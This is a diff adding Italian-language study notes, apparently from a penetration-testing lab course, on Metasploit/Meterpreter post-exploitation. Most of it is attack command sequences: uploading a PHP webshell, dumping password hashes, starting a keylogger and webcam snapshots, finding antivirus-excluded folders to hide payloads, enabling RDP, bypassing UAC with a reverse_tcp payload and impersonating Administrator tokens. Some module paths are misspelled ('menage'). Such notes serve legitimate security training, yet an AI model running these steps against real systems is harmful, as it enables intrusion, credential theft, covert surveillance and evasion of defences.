@@ -1134,3 +1134,305 @@ sysinfo
 getuid
 ```
 
+## Post Exploitation Fundamentals
+
+### Comandi fondamentali in Meterpreter
+
+#### Post Exploitation
+
+```
+sysinfo
+getuid
+help
+shell //per ottenere una shell del SO, per eseguire i comandi
+CTRL+C //per terminare la shell e tornare a meterpreter
+ps //lista i processi running sul sistema
+migrate 580 //per migrare a processi ai quali abbiamo permesso
+migrate -N apache2 //per migrare a processi con il loro nome invece del PID
+execute -f ifconfig //crea un processo ed esegue direttamente il comando
+```
+
+#### Gestire le sessioni
+
+```
+background //oppure CTRL+Z
+kill //killa la sessione
+sessions //permette di gestire tutte le sessioni attive
+sessions -h
+sessions -C sysinfo -i 1  //Per eseguire un comando su una meterpreter, senza renderla interattiva
+sessions 1
+background
+sessions -h
+sessions -k 1 //per killare la sessione 1
+sessions -l //lista le sessioni attive
+sessions -n xoda -i 1 //assegna un nome ad una sessione
+sessions xoda //per interagire con essa
+```
+
+#### Navigare il file system
+
+```
+ls 
+lls //come ls -al
+pwd 
+cd ..
+ls
+cat flag1
+edit flag1 //apre il file in vim, chiudi con :q
+cd "Secret Files"
+cat .flag2
+cd ..
+ls
+downlad flag5.zip
+CTRL+Z
+ls
+unzip flag5.zip
+ls
+cat list //il file estratto, che ci dice di guardare l'MD5 hash di /bin/bash. Quindi torniamo nella meterpreter session
+checksum md5 /bin/bash //e l'output è la flag
+getenv PATH //per enumerare vairabili d'ambiente come PATH
+getenv TERM //il terminale assegnato a questo utente, valido per utenti che possono accedere tramite terminale
+search -d /usr/bin -f *backdoor*
+search -f *.php
+download flag1
+sessions 1
+mkdir test
+rmdir test
+lcd /root/Desktop/tools  //Change to tools directory on the local machine
+upload /usr/share/webshells/php/php-backdoor.php  //Upload a PHP webshell to app directory of the remote machine
+```
+
+### Upgrading Command Shells To Meterpreter Shells
+
+#### Utilizzando un modulo post-exploitation
+
+```
+search shell_to_meterpreter
+use post/multi/menage/shell_to_meterpreter
+show options
+set SESSION 1
+set LHOST eth1
+run
+sessions
+sessions 2
+exit
+sessions
+```
+
+#### Metodo più semplice, con un utile comando
+
+```
+sessions
+sessions -h
+sessions -u 1 //il flag -u fa l'upgrade da shell a meterpreter session
+```
+
+## Windows Post Exploitation
+
+### Moduli utili per Post Exploitation Windows
+
+#### Windows Meterpreter comandi utili
+
+```
+sysinfo
+getuid
+help
+getsystem
+getuid
+hashdump
+show_mount
+ps
+migrate 2212 //oppure migrate explorere.exe
+cd C:\\
+dir
+cat flag.txt
+download flag.txt
+
+hashdump
+vari webcam commands come:
+webcam_snap
+//vari user interface commands
+keyscan_start //start keylogger
+screenshot
+
+loot // visualizzare i dati salvati da esecuzione di moduli post exploitation
+
+CTRL+Z //per mettere in background
+```
+
+#### Migrare il processo della meterpreter session, o migrare l'architettura
+
+```
+search migrate platform:windows //per cambiare architettura del meterpreter payload
+//use post/windows/menage/archmigrate
+use post/windows/menage/migrate //per migrare Process ID
+show options
+set SESSION 1
+run
+```
+
+#### Elenca i privilegi dell'utente Windows della sessione attiva
+
+```
+search win_privs
+use post/windows/gather/win_privs //elenca i privilegi dell'utente windows
+show options
+set SESSION 1
+run //mostra informazioni come se è admin, è system, è nell'admin group, User Access Control abilitato per fare privesc
+```
+
+#### Lista storico utenti loggati e attualmente loggati
+
+```
+search enum_logged_on
+use post/windows/gather/enum_logged_on_users
+show options
+set SESSION 1
+run
+```
+
+#### Controlla se è una VM
+
+```
+search checkvm
+use post/windows/gather/checkvm
+show options
+set SESSION 1
+run
+```
+
+#### Enumerare i programmi installati sulla macchina
+
+```
+search enum_applications
+use post/windows/gather/enum_applications
+set SESSION 1
+run
+loot // i dati dei risultati sono salvati in file nascosti, che possiamo visualizzare con loot
+```
+
+#### Check antivirus e cartelle escluse dall'AV
+
+```
+search type:post platform:windows enum_av
+use post/windows/gather/enum_av_excluded
+show options
+set SESSION 1
+run
+```
+
+è utile sapere le cartelle con esclusioni perché possiamo usarle per caricarci nostri virus e payload in modo che non vengano individuati dall'antivirus.
+
+#### Enumerare i PC che fanno parte del dominio
+
+```
+search enum_computer
+use post/windows/gather/enum_computers
+show options
+set SESSION 1
+run
+```
+
+#### Enumerare le patch di Microsoft installate
+
+```
+search enum_patches
+use post/windows/gather/enum_patches
+show options
+set SESSION 1
+run // e ci restituisce un errore dicendo di provare a migrare su un altro processo
+sessions 1
+ps //guardiamo gli altri processi disponibili e individuiamo svchost.exe che è SYSTEM
+migrate 896
+background
+run // ci dà ancora errore allora andiamo a cercare da soli questa info
+sessions 1
+shell
+systeminfo //comando di windows che ci mostra tra le altre cose tutte le patch installate
+CTRL+C
+background
+```
+
+è possibile impostare la singola patch di Windows (il relativo KB) che vogliamo controllare se è stata installata.
+
+#### Enumerare le shares disponibili
+
+```
+search enum_shares
+use post/windows/gather/enum_shares
+show options
+//l'opzione ENTERED serve per vedere le share recentemente inserite nel path di esplora risorse
+set SESSION 1
+run
+```
+
+#### Check RDP abilitato oppure abilita RDP sul target
+
+```
+search rdp platform:windows
+use post/windows/menage/enable_rdp
+show options
+set SESSION 1
+//non abbiamo le credenziali quindi non riusciamo a connetterci, ma possiamo usarlo per fare il check
+run
+// verifica se RDP è abilitato oppure lo abilita
+```
+
+### Bypassing UAC
+
+#### Local enumeration
+
+```
+getsystem //ma fallisce
+getprivs
+shell
+net users // e abbiamo gli utenti: admin, Administrator e Guest.
+net localgroup administrators //e vediamo che admin è nel gruppo amministratori, quindi possiamo disattivare UAC in modo semplice
+CTRL+C
+ps -S explorer.exe
+migrate 2124 // Please note the explorer.exe arch is x64 bit, so later when we perform UAC bypass, we have to use x64 based meterpreter payload.
+background
+sessions
+```
+
+#### Privilege exploitation / Bypassing UAC
+
+```
+search bypassuac
+use exploit/windows/local/bypassuac_injection
+set payload windows/x64/meterpreter/reverse_tcp
+show options
+set SESSION 1
+set LPORT 4433 //perché la 4444 era già occupata dall'altra sessione attiva
+run // ma ci viene detto che l'exploit è fallito perché il target è x64
+set TARGET Windows\ x64 //suggerito con TAB
+run
+sysinfo
+getuid //siamo ancora admin, ma ora l'UAC è stato disabilitato quindi...
+getsystem // funziona l'escalation dei privilegi
+getuid // siamo NT AUTHORITY\SYSTEM
+hashdump
+```
+
+### Token Impersonation With Incognito
+
+```
+getuid
+getprivs //Abbiamo SeImpersonatePrivilege quindi possiamo impersonare un token
+hashdump //per dimostrare che fallisce e non abbiamo i permessi
+cd C:\\Users
+cd Administrator //fallisce, non abbiamo i permessi
+// Ora facciamo Privilege Escalation con il modulo Incognito
+load incognito
+list tokens -u //per gli user access tokens: mostra sia delegation che impersonation tokens
+impersonate_token "ATTACKDEFENSE\Administrator" //che è uno dei delegation token disponibili
+getuid
+hashdump //fallsice perché dobbiamo migrare il processo, perché il processo nel quale siamo è ancora associato all'utente LOCAL SERVICE
+ps
+migrate 3544 //per migrare a explorer.exe
+hashdump //ora ci mostra gli hash
+cd C:\\
+cd Users
+cd Administrator
+dir //ora abbiamo accesso alla cartella Administrator
+```
